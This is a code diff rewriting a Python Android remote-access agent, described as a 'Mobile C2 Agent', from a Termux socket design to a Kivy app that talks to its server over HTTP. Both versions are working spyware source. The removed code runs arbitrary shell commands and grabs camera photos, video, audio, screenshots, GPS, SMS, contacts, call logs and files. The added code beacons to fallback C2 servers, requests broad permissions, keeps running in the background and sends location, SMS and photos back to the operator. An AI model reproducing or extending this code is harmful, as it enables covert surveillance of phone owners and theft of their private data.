@@ -1,565 +1,583 @@
 """
-Android Mobile Agent - Telefon uchun C2 Agent
-Barcha funksiyalar: Camera, Audio, Screenshot, GPS, SMS, Contacts, Files
+Mobile Agent (Android) - Kivy asosida
+Multi-protocol, Auto-reconnect, Self-preservation
+Termux'siz ishlaydi - Kivy embedded Python bilan
 """
 
-import socket
-import json
-import threading
-import time
 import os
 import sys
-import base64
+import time
+import json
+import platform
+import threading
 from datetime import datetime
+
+# Kivy imports
+try:
+    from kivy.app import App
+    from kivy.clock import Clock
+    from kivy.utils import platform as kivy_platform
+    KIVY_AVAILABLE = True
+except ImportError:
+    KIVY_AVAILABLE = False
+    print("⚠️ Kivy topilmadi - faqat test rejimida")
+
+# Android-specific imports
+if KIVY_AVAILABLE and kivy_platform == 'android':
+    from jnius import autoclass, cast
+    from android.permissions import request_permissions, Permission
+    from android.runnable import run_on_ui_thread
+    
+    # Android classes
+    PythonActivity = autoclass('org.kivy.android.PythonActivity')
+    Intent = autoclass('android.content.Intent')
+    PendingIntent = autoclass('android.app.PendingIntent')
+    AndroidString = autoclass('java.lang.String')
+    Context = autoclass('android.content.Context')
+    
+    # Plyer imports (cross-platform)
+    try:
+        from plyer import battery, vibrator, gps, sms, camera
+        PLYER_AVAILABLE = True
+    except ImportError:
+        PLYER_AVAILABLE = False
+        print("⚠️ Plyer topilmadi")
+
+# HTTP client
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+    # Fallback to urllib
+    import urllib.request
+    import urllib.error
 
 
 class MobileAgent:
-    """Android telefon uchun C2 agent"""
+    """Android uchun to'liq agent"""
     
-    def __init__(self, server_host, server_port):
-        self.host = server_host
-        self.port = server_port
-        self.socket = None
-        self.running = False
+    def __init__(self, server_host, server_port=8000, protocol='http'):
+        self.server_host = server_host
+        self.server_port = server_port
+        self.protocol = protocol
+        self.session_id = None
+        self.running = True
         
-        # Device info
-        self.device_info = self.get_device_info()
+        # Fallback servers
+        self.servers = [{'host': server_host, 'port': server_port, 'protocol': protocol}]
+        self.current_server_index = 0
         
-    def get_device_info(self):
-        """Telefon haqida ma'lumot"""
-        try:
-            import platform
-            
-            info = {
-                'type': 'ANDROID',
-                'platform': platform.system(),
-                'hostname': socket.gethostname(),
-                'python_version': sys.version,
-                'capabilities': [
-                    'camera',
-                    'microphone', 
-                    'screenshot',
-                    'gps',
-                    'sms',
-                    'contacts',
-                    'files',
-                    'shell'
-                ]
-            }
-            
-            # Try to get Android-specific info
+        # Reconnection
+        self.retry_delay = 10  # Mobile da sekinroq
+        self.max_retries = 3
+        self.connection_failed_count = 0
+        
+        # Heartbeat
+        self.heartbeat_interval = 30  # Mobile da uzunroq (battery save)
+        
+        # Agent ID
+        self.agent_id = self._generate_agent_id()
+        
+        # Platform
+        self.is_android = KIVY_AVAILABLE and kivy_platform == 'android'
+        
+        print(f"📱 Mobile Agent ishga tushirildi")
+        print(f"   Agent ID: {self.agent_id}")
+        print(f"   Platform: {'Android' if self.is_android else 'Desktop'}")
+        print(f"   Protocol: {protocol.upper()}")
+        print(f"   Server: {server_host}:{server_port}")
+        
+        # Request permissions (Android)
+        if self.is_android:
+            self._request_permissions()
+    
+    def _generate_agent_id(self):
+        """Unique agent ID"""
+        import uuid
+        
+        # Android device ID
+        device_id = "unknown"
+        if self.is_android:
             try:
-                # Check if running on Android (Termux)
-                if os.path.exists('/data/data/com.termux'):
-                    info['type'] = 'ANDROID_TERMUX'
-                    
-                # Try to get Android version
-                try:
-                    result = os.popen('getprop ro.build.version.release').read().strip()
-                    info['android_version'] = result
-                except:
-                    pass
-                    
-                # Device model
-                try:
-                    model = os.popen('getprop ro.product.model').read().strip()
-                    info['device_model'] = model
-                except:
-                    pass
-                    
+                context = PythonActivity.mActivity
+                android_id = autoclass('android.provider.Settings$Secure').getString(
+                    context.getContentResolver(),
+                    autoclass('android.provider.Settings$Secure').ANDROID_ID
+                )
+                device_id = android_id
             except:
                 pass
+        
+        return f"mobile_{device_id}_{uuid.uuid4().hex[:8]}"
+    
+    def _request_permissions(self):
+        """Android permissions so'rash"""
+        permissions = [
+            Permission.INTERNET,
+            Permission.ACCESS_FINE_LOCATION,
+            Permission.ACCESS_COARSE_LOCATION,
+            Permission.CAMERA,
+            Permission.READ_SMS,
+            Permission.SEND_SMS,
+            Permission.READ_CONTACTS,
+            Permission.READ_CALL_LOG,
+            Permission.VIBRATE,
+            Permission.WAKE_LOCK,
+            Permission.RECEIVE_BOOT_COMPLETED,
+            Permission.FOREGROUND_SERVICE
+        ]
+        
+        try:
+            request_permissions(permissions)
+            print("✅ Permissions so'ralmoqda...")
+        except Exception as e:
+            print(f"⚠️ Permissions xatosi: {e}")
+    
+    def add_fallback_server(self, host, port=8000, protocol='http'):
+        """Fallback server qo'shish"""
+        self.servers.append({'host': host, 'port': port, 'protocol': protocol})
+        print(f"➕ Fallback server: {protocol}://{host}:{port}")
+    
+    def _http_request(self, url, method='GET', data=None, timeout=15):
+        """HTTP request (requests yoki urllib)"""
+        try:
+            if REQUESTS_AVAILABLE:
+                # requests library
+                if method == 'GET':
+                    response = requests.get(url, timeout=timeout)
+                else:
+                    response = requests.post(url, json=data, timeout=timeout)
                 
-            return info
+                return response.json() if response.status_code == 200 else None
             
+            else:
+                # urllib fallback
+                if method == 'POST' and data:
+                    data_bytes = json.dumps(data).encode('utf-8')
+                    req = urllib.request.Request(
+                        url,
+                        data=data_bytes,
+                        headers={'Content-Type': 'application/json'},
+                        method='POST'
+                    )
+                else:
+                    req = urllib.request.Request(url, method='GET')
+                
+                with urllib.request.urlopen(req, timeout=timeout) as response:
+                    return json.loads(response.read().decode())
+                    
         except Exception as e:
-            return {
-                'type': 'MOBILE',
-                'error': str(e)
+            print(f"⚠️ HTTP request xatosi: {e}")
+            return None
+    
+    def register(self):
+        """Serverga ro'yxatdan o'tish"""
+        while True:
+            try:
+                url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/register/"
+                
+                payload = {
+                    'agent_id': self.agent_id,
+                    'hostname': self._get_device_name(),
+                    'platform': 'Android',
+                    'os_version': self._get_android_version(),
+                    'ip_address': self._get_local_ip(),
+                    'protocol': self.protocol,
+                    'system_info': self._get_system_info()
+                }
+                
+                result = self._http_request(url, method='POST', data=payload)
+                
+                if result:
+                    self.session_id = result.get('session_id')
+                    print(f"✅ Ro'yxatdan o'tdik")
+                    print(f"   Session ID: {self.session_id}")
+                    self.connection_failed_count = 0
+                    return True
+                    
+            except Exception as e:
+                print(f"❌ Ro'yxatdan o'tish xatosi: {e}")
+            
+            self.connection_failed_count += 1
+            
+            if self.connection_failed_count >= self.max_retries:
+                print(f"⚠️ {self.max_retries} marta xato, keyingi serverga o'tilmoqda...")
+                self._switch_to_next_server()
+                self.connection_failed_count = 0
+            
+            print(f"⏳ {self.retry_delay}s kutish...")
+            time.sleep(self.retry_delay)
+    
+    def _switch_to_next_server(self):
+        """Keyingi serverga o'tish"""
+        if len(self.servers) <= 1:
+            return
+        
+        self.current_server_index = (self.current_server_index + 1) % len(self.servers)
+        next_server = self.servers[self.current_server_index]
+        
+        self.server_host = next_server['host']
+        self.server_port = next_server['port']
+        self.protocol = next_server.get('protocol', 'http')
+        
+        print(f"🔄 Yangi server: {self.protocol}://{self.server_host}:{self.server_port}")
+    
+    def heartbeat(self):
+        """Server bilan aloqa"""
+        try:
+            url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/{self.agent_id}/heartbeat/"
+            
+            payload = {
+                'agent_id': self.agent_id,
+                'status': 'active',
+                'protocol': self.protocol,
+                'battery': self._get_battery_info(),
+                'timestamp': datetime.now().isoformat()
             }
-    
-    def connect(self):
-        """Serverga ulanish"""
-        try:
-            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.connect((self.host, self.port))
             
-            # Send device info
-            self.send_data({
-                'type': 'DEVICE_INFO',
-                'data': self.device_info
-            })
+            result = self._http_request(url, method='POST', data=payload)
             
-            print(f"[+] Connected to C2 Server: {self.host}:{self.port}")
-            self.running = True
-            return True
+            if result:
+                # Ulanish tiklandi
+                if self.connection_failed_count > 0:
+                    print("✅ Ulanish tiklandi!")
+                    self.connection_failed_count = 0
+                
+                # Komandalar
+                if 'commands' in result and result['commands']:
+                    for cmd in result['commands']:
+                        self._execute_command(cmd)
+            else:
+                raise Exception("Heartbeat javob yo'q")
+                
+        except Exception as e:
+            print(f"⚠️ Heartbeat xatosi: {e}")
+            self.connection_failed_count += 1
             
-        except Exception as e:
-            print(f"[-] Connection failed: {e}")
-            return False
+            if self.connection_failed_count >= self.max_retries:
+                print("🔄 Keyingi serverga o'tilmoqda...")
+                self._switch_to_next_server()
+                self.connection_failed_count = 0
+                self.register()
     
-    def send_data(self, data):
-        """Ma'lumot yuborish"""
-        try:
-            json_data = json.dumps(data)
-            self.socket.send(json_data.encode() + b'\n')
-            return True
-        except Exception as e:
-            print(f"[-] Send error: {e}")
-            return False
-    
-    def receive_command(self):
-        """Komanda qabul qilish"""
-        try:
-            data = self.socket.recv(4096).decode()
-            if data:
-                return json.loads(data)
-            return None
-        except Exception as e:
-            print(f"[-] Receive error: {e}")
-            return None
-    
-    def execute_command(self, command_data):
+    def _execute_command(self, command):
         """Komandani bajarish"""
         try:
-            cmd_type = command_data.get('type')
+            cmd_type = command.get('type', '').lower()
+            cmd_data = command.get('data', '')
             
-            if cmd_type == 'SHELL':
-                return self.execute_shell(command_data.get('command'))
-                
-            elif cmd_type == 'SCREENSHOT':
-                return self.take_screenshot()
-                
-            elif cmd_type == 'CAMERA_PHOTO':
-                return self.take_photo(command_data.get('camera', 'back'))
-                
-            elif cmd_type == 'CAMERA_VIDEO':
-                return self.record_video(command_data.get('duration', 10))
-                
-            elif cmd_type == 'RECORD_AUDIO':
-                return self.record_audio(command_data.get('duration', 10))
-                
-            elif cmd_type == 'GET_GPS':
-                return self.get_gps_location()
-                
-            elif cmd_type == 'GET_SMS':
-                return self.get_sms_messages()
-                
-            elif cmd_type == 'SEND_SMS':
-                return self.send_sms(
-                    command_data.get('number'),
-                    command_data.get('message')
-                )
-                
-            elif cmd_type == 'GET_CONTACTS':
-                return self.get_contacts()
-                
-            elif cmd_type == 'GET_CALL_LOG':
-                return self.get_call_log()
-                
-            elif cmd_type == 'LIST_FILES':
-                return self.list_files(command_data.get('path', '/sdcard'))
-                
-            elif cmd_type == 'DOWNLOAD_FILE':
-                return self.download_file(command_data.get('filepath'))
-                
-            elif cmd_type == 'UPLOAD_FILE':
-                return self.upload_file(
-                    command_data.get('filepath'),
-                    command_data.get('content')
-                )
-                
-            elif cmd_type == 'GET_DEVICE_INFO':
-                return {'status': 'success', 'data': self.device_info}
-                
-            elif cmd_type == 'VIBRATE':
-                return self.vibrate(command_data.get('duration', 500))
-                
+            print(f"📥 Komanda: {cmd_type}")
+            
+            if cmd_type == 'sysinfo':
+                result = self._get_system_info()
+            elif cmd_type == 'battery':
+                result = self._get_battery_info()
+            elif cmd_type == 'location':
+                result = self._get_location()
+            elif cmd_type == 'vibrate':
+                result = self._vibrate(cmd_data)
+            elif cmd_type == 'sms_send':
+                result = self._send_sms(cmd_data)
+            elif cmd_type == 'sms_read':
+                result = self._read_sms()
+            elif cmd_type == 'contacts':
+                result = self._get_contacts()
+            elif cmd_type == 'camera':
+                result = self._take_photo()
             else:
-                return {'status': 'error', 'message': f'Unknown command: {cmd_type}'}
-                
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def execute_shell(self, command):
-        """Shell komanda bajarish"""
-        try:
-            import subprocess
-            result = subprocess.check_output(
-                command,
-                shell=True,
-                stderr=subprocess.STDOUT,
-                timeout=30
-            ).decode()
+                result = {'error': f'Noma\'lum komanda: {cmd_type}'}
             
-            return {'status': 'success', 'output': result}
+            self._send_result(command.get('id'), result)
             
         except Exception as e:
-            return {'status': 'error', 'message': str(e)}
+            print(f"❌ Komanda xatosi: {e}")
+            self._send_result(command.get('id'), {'error': str(e)})
     
-    def take_screenshot(self):
-        """Screenshot olish (Android)"""
-        try:
-            # Use screencap command (requires Termux:API)
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filepath = f'/sdcard/screenshot_{timestamp}.png'
-            
-            # Try screencap command
-            os.system(f'screencap -p {filepath}')
-            
-            # Check if file exists
-            if os.path.exists(filepath):
-                # Read and encode
-                with open(filepath, 'rb') as f:
-                    image_data = base64.b64encode(f.read()).decode()
-                
-                # Clean up
-                os.remove(filepath)
-                
-                return {
-                    'status': 'success',
-                    'image': image_data,
-                    'format': 'png'
-                }
-            else:
-                return {
-                    'status': 'error',
-                    'message': 'Screenshot failed - Install Termux:API'
-                }
-                
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def take_photo(self, camera='back'):
-        """Kamera orqali rasm olish"""
-        try:
-            # Requires Termux:API
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filepath = f'/sdcard/photo_{timestamp}.jpg'
-            
-            # Use termux-camera-photo command
-            camera_id = '0' if camera == 'back' else '1'
-            os.system(f'termux-camera-photo -c {camera_id} {filepath}')
-            
-            time.sleep(2)  # Wait for capture
-            
-            if os.path.exists(filepath):
-                with open(filepath, 'rb') as f:
-                    image_data = base64.b64encode(f.read()).decode()
-                
-                os.remove(filepath)
-                
-                return {
-                    'status': 'success',
-                    'image': image_data,
-                    'camera': camera,
-                    'format': 'jpg'
-                }
-            else:
-                return {
-                    'status': 'error',
-                    'message': 'Camera capture failed - Install Termux:API'
-                }
-                
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def record_video(self, duration=10):
-        """Video yozish"""
-        try:
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filepath = f'/sdcard/video_{timestamp}.mp4'
-            
-            # termux-camera-video
-            os.system(f'timeout {duration}s termux-camera-video {filepath}')
-            
-            time.sleep(duration + 1)
-            
-            if os.path.exists(filepath):
-                # Get file size
-                size = os.path.getsize(filepath)
-                
-                return {
-                    'status': 'success',
-                    'filepath': filepath,
-                    'size': size,
-                    'duration': duration,
-                    'message': f'Video saved: {filepath}'
-                }
-            else:
-                return {'status': 'error', 'message': 'Video recording failed'}
-                
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def record_audio(self, duration=10):
-        """Audio yozish"""
-        try:
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filepath = f'/sdcard/audio_{timestamp}.wav'
-            
-            # termux-microphone-record
-            os.system(f'timeout {duration}s termux-microphone-record -f {filepath}')
-            
-            time.sleep(duration + 1)
-            
-            if os.path.exists(filepath):
-                with open(filepath, 'rb') as f:
-                    audio_data = base64.b64encode(f.read()).decode()
-                
-                os.remove(filepath)
-                
-                return {
-                    'status': 'success',
-                    'audio': audio_data,
-                    'duration': duration,
-                    'format': 'wav'
-                }
-            else:
-                return {'status': 'error', 'message': 'Audio recording failed'}
-                
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def get_gps_location(self):
-        """GPS joylashuv"""
-        try:
-            # termux-location
-            import subprocess
-            result = subprocess.check_output(
-                'termux-location -p network',
-                shell=True,
-                timeout=10
-            ).decode()
-            
-            location = json.loads(result)
-            
-            return {
-                'status': 'success',
-                'location': location,
-                'latitude': location.get('latitude'),
-                'longitude': location.get('longitude'),
-                'accuracy': location.get('accuracy'),
-                'provider': location.get('provider')
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def get_sms_messages(self):
-        """SMS xabarlar"""
-        try:
-            import subprocess
-            result = subprocess.check_output(
-                'termux-sms-list',
-                shell=True,
-                timeout=10
-            ).decode()
-            
-            messages = json.loads(result)
-            
-            return {
-                'status': 'success',
-                'messages': messages,
-                'count': len(messages)
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def send_sms(self, number, message):
-        """SMS yuborish"""
-        try:
-            os.system(f'termux-sms-send -n {number} "{message}"')
-            
-            return {
-                'status': 'success',
-                'message': f'SMS sent to {number}'
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def get_contacts(self):
-        """Kontaktlar"""
-        try:
-            import subprocess
-            result = subprocess.check_output(
-                'termux-contact-list',
-                shell=True,
-                timeout=10
-            ).decode()
-            
-            contacts = json.loads(result)
-            
-            return {
-                'status': 'success',
-                'contacts': contacts,
-                'count': len(contacts)
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def get_call_log(self):
-        """Qo'ng'iroq tarixi"""
-        try:
-            import subprocess
-            result = subprocess.check_output(
-                'termux-call-log',
-                shell=True,
-                timeout=10
-            ).decode()
-            
-            call_log = json.loads(result)
-            
-            return {
-                'status': 'success',
-                'call_log': call_log,
-                'count': len(call_log)
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def list_files(self, path):
-        """Fayllar ro'yxati"""
-        try:
-            files = []
-            for item in os.listdir(path):
-                full_path = os.path.join(path, item)
-                is_dir = os.path.isdir(full_path)
-                
-                try:
-                    size = os.path.getsize(full_path) if not is_dir else 0
-                except:
-                    size = 0
-                
-                files.append({
-                    'name': item,
-                    'path': full_path,
-                    'is_directory': is_dir,
-                    'size': size
-                })
-            
-            return {
-                'status': 'success',
-                'files': files,
-                'path': path
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def download_file(self, filepath):
-        """Fayl yuklash (C2 serverga)"""
-        try:
-            with open(filepath, 'rb') as f:
-                file_data = base64.b64encode(f.read()).decode()
-            
-            return {
-                'status': 'success',
-                'file_data': file_data,
-                'filename': os.path.basename(filepath),
-                'size': os.path.getsize(filepath)
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def upload_file(self, filepath, content):
-        """Fayl yuklash (serverdan telefonga)"""
-        try:
-            # Decode base64
-            file_data = base64.b64decode(content)
-            
-            # Write file
-            with open(filepath, 'wb') as f:
-                f.write(file_data)
-            
-            return {
-                'status': 'success',
-                'filepath': filepath,
-                'size': len(file_data)
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def vibrate(self, duration=500):
-        """Telefon vibratsiyasi"""
-        try:
-            os.system(f'termux-vibrate -d {duration}')
-            
-            return {
-                'status': 'success',
-                'message': f'Vibrated for {duration}ms'
-            }
-            
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def run(self):
-        """Agent ishga tushirish"""
-        while self.running:
-            try:
-                command = self.receive_command()
-                
-                if command:
-                    print(f"[>] Command: {command.get('type')}")
-                    
-                    # Execute command
-                    result = self.execute_command(command)
-                    
-                    # Send result
-                    self.send_data({
-                        'type': 'COMMAND_RESULT',
-                        'command_type': command.get('type'),
-                        'result': result
-                    })
-                    
-                time.sleep(0.1)
-                
-            except KeyboardInterrupt:
-                print("\n[!] Shutting down...")
-                break
-                
-            except Exception as e:
-                print(f"[-] Error: {e}")
-                time.sleep(1)
+    def _get_system_info(self):
+        """System info"""
+        info = {
+            'agent_id': self.agent_id,
+            'platform': 'Android' if self.is_android else 'Desktop',
+            'device_name': self._get_device_name(),
+            'android_version': self._get_android_version(),
+            'ip_address': self._get_local_ip(),
+            'battery': self._get_battery_info()
+        }
         
-        self.disconnect()
+        if self.is_android:
+            try:
+                # Android-specific info
+                build = autoclass('android.os.Build')
+                info['manufacturer'] = build.MANUFACTURER
+                info['model'] = build.MODEL
+                info['device'] = build.DEVICE
+                info['sdk_version'] = build.VERSION.SDK_INT
+            except:
+                pass
+        
+        return info
     
-    def disconnect(self):
-        """Ulanishni uzish"""
+    def _get_device_name(self):
+        """Device name"""
+        if self.is_android:
+            try:
+                build = autoclass('android.os.Build')
+                return f"{build.MANUFACTURER} {build.MODEL}"
+            except:
+                return "Android Device"
+        return platform.node()
+    
+    def _get_android_version(self):
+        """Android version"""
+        if self.is_android:
+            try:
+                build = autoclass('android.os.Build')
+                return build.VERSION.RELEASE
+            except:
+                return "Unknown"
+        return platform.system()
+    
+    def _get_local_ip(self):
+        """Local IP"""
         try:
-            if self.socket:
-                self.socket.close()
-            print("[+] Disconnected")
+            import socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(('8.8.8.8', 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
         except:
-            pass
+            return '127.0.0.1'
+    
+    def _get_battery_info(self):
+        """Battery info"""
+        if PLYER_AVAILABLE:
+            try:
+                status = battery.status
+                return {
+                    'percentage': status.get('percentage', 0),
+                    'isCharging': status.get('isCharging', False)
+                }
+            except:
+                pass
+        return {'percentage': 0, 'isCharging': False}
+    
+    def _get_location(self):
+        """GPS location"""
+        if PLYER_AVAILABLE and self.is_android:
+            try:
+                gps.configure(on_location=lambda **kwargs: kwargs)
+                gps.start(minTime=1000, minDistance=0)
+                time.sleep(2)  # Wait for GPS
+                
+                location = gps.get_last_known_location()
+                gps.stop()
+                
+                if location:
+                    return {
+                        'success': True,
+                        'latitude': location.get('lat', 0),
+                        'longitude': location.get('lon', 0),
+                        'accuracy': location.get('accuracy', 0)
+                    }
+            except Exception as e:
+                return {'success': False, 'error': str(e)}
+        
+        return {'success': False, 'error': 'GPS mavjud emas'}
+    
+    def _vibrate(self, duration=1):
+        """Vibrate"""
+        if PLYER_AVAILABLE:
+            try:
+                vibrator.vibrate(duration)
+                return {'success': True, 'duration': duration}
+            except Exception as e:
+                return {'success': False, 'error': str(e)}
+        return {'success': False, 'error': 'Vibrator mavjud emas'}
+    
+    def _send_sms(self, data):
+        """SMS yuborish"""
+        if PLYER_AVAILABLE and self.is_android:
+            try:
+                phone = data.get('phone')
+                message = data.get('message')
+                
+                sms.send(recipient=phone, message=message)
+                
+                return {
+                    'success': True,
+                    'phone': phone,
+                    'message': message
+                }
+            except Exception as e:
+                return {'success': False, 'error': str(e)}
+        
+        return {'success': False, 'error': 'SMS mavjud emas'}
+    
+    def _read_sms(self):
+        """SMS o'qish"""
+        # Bu android.permissions va content resolver kerak
+        # Plyer'da to'liq SMS read yo'q, jnius kerak
+        return {'success': False, 'error': 'SMS read hozircha qo\'llab-quvvatlanmaydi'}
+    
+    def _get_contacts(self):
+        """Kontaktlar"""
+        # content resolver kerak
+        return {'success': False, 'error': 'Contacts hozircha qo\'llab-quvvatlanmaydi'}
+    
+    def _take_photo(self):
+        """Rasm olish"""
+        if PLYER_AVAILABLE:
+            try:
+                # Camera path
+                photo_path = '/sdcard/DCIM/agent_photo.jpg'
+                camera.take_picture(filename=photo_path, on_complete=lambda x: x)
+                
+                time.sleep(2)  # Wait for camera
+                
+                # Base64 encode
+                if os.path.exists(photo_path):
+                    import base64
+                    with open(photo_path, 'rb') as f:
+                        photo_data = base64.b64encode(f.read()).decode()
+                    
+                    os.remove(photo_path)  # Cleanup
+                    
+                    return {
+                        'success': True,
+                        'photo': photo_data,
+                        'size': len(photo_data)
+                    }
+            except Exception as e:
+                return {'success': False, 'error': str(e)}
+        
+        return {'success': False, 'error': 'Camera mavjud emas'}
+    
+    def _send_result(self, command_id, result):
+        """Natijani yuborish"""
+        try:
+            url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/{self.agent_id}/result/"
+            
+            payload = {
+                'agent_id': self.agent_id,
+                'command_id': command_id,
+                'result': result,
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            response = self._http_request(url, method='POST', data=payload)
+            
+            if response:
+                print("✅ Natija yuborildi")
+            else:
+                print("⚠️ Natija yuborishda xato")
+                
+        except Exception as e:
+            print(f"⚠️ Natija yuborish xatosi: {e}")
+    
+    def run_background(self):
+        """Background threadda ishga tushirish"""
+        def background_worker():
+            # Ro'yxatdan o'tish
+            self.register()
+            
+            # Heartbeat loop
+            while self.running:
+                try:
+                    self.heartbeat()
+                    time.sleep(self.heartbeat_interval)
+                except Exception as e:
+                    print(f"❌ Background worker xatosi: {e}")
+                    time.sleep(self.retry_delay)
+        
+        thread = threading.Thread(target=background_worker, daemon=True)
+        thread.start()
+        print("🔄 Background worker ishga tushdi")
+
+
+class MobileAgentApp(App):
+    """Kivy App wrapper"""
+    
+    def __init__(self, server_host, server_port=8000, protocol='http', **kwargs):
+        super().__init__(**kwargs)
+        self.agent = MobileAgent(server_host, server_port, protocol)
+    
+    def build(self):
+        """Build UI (yoki UI-siz)"""
+        from kivy.uix.label import Label
+        
+        # Background worker ishga tushirish
+        self.agent.run_background()
+        
+        # Minimal UI
+        return Label(
+            text='Agent ishlamoqda...\n(Background service)',
+            halign='center',
+            font_size='20sp'
+        )
+    
+    def on_start(self):
+        """App start"""
+        print("📱 Mobile Agent App started")
+    
+    def on_pause(self):
+        """App pause - background da davom etish"""
+        return True  # True = pause qilinganda ham ishlaydi
+    
+    def on_resume(self):
+        """App resume"""
+        pass
+    
+    def on_stop(self):
+        """App stop"""
+        self.agent.running = False
+        print("⏹️ Mobile Agent stopped")
 
 
 def main():
     """Main entry point"""
-    print("="*50)
-    print("🤖 Mobile C2 Agent - Android")
-    print("="*50)
+    import argparse
     
-    # Configuration
-    SERVER_HOST = "YOUR_C2_SERVER_IP"  # C2 server IP manzili
-    SERVER_PORT = 9999
+    parser = argparse.ArgumentParser(description='Mobile C2 Agent (Android)')
+    parser.add_argument('server', help='Server URL yoki IP')
+    parser.add_argument('--port', type=int, default=8000, help='Port (default: 8000)')
+    parser.add_argument('--protocol', choices=['http', 'https'], default='http', help='Protocol')
+    parser.add_argument('--interval', type=int, default=30, help='Heartbeat interval (s)')
+    parser.add_argument('--fallback', nargs='+', help='Fallback servers (IP:PORT:PROTOCOL)')
     
-    # Create agent
-    agent = MobileAgent(SERVER_HOST, SERVER_PORT)
+    args = parser.parse_args()
     
-    # Connect and run
-    if agent.connect():
-        print("[+] Agent running...")
-        agent.run()
+    # Server parse
+    server_url = args.server
+    if server_url.startswith('http://') or server_url.startswith('https://'):
+        from urllib.parse import urlparse
+        parsed = urlparse(server_url)
+        server_host = parsed.hostname
+        server_port = parsed.port or args.port
+        protocol = parsed.scheme
     else:
-        print("[-] Failed to connect to C2 server")
+        server_host = server_url
+        server_port = args.port
+        protocol = args.protocol
+    
+    if KIVY_AVAILABLE:
+        # Kivy app
+        app = MobileAgentApp(server_host, server_port, protocol)
+        
+        # Fallback servers
+        if args.fallback:
+            for fb in args.fallback:
+                parts = fb.split(':')
+                if len(parts) >= 2:
+                    app.agent.add_fallback_server(parts[0], int(parts[1]), parts[2] if len(parts) > 2 else 'http')
+        
+        app.agent.heartbeat_interval = args.interval
+        app.run()
+    else:
+        print("❌ Kivy topilmadi - mobile agent ishlamaydi")
+        print("   Kivy o'rnating: pip install kivy")
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
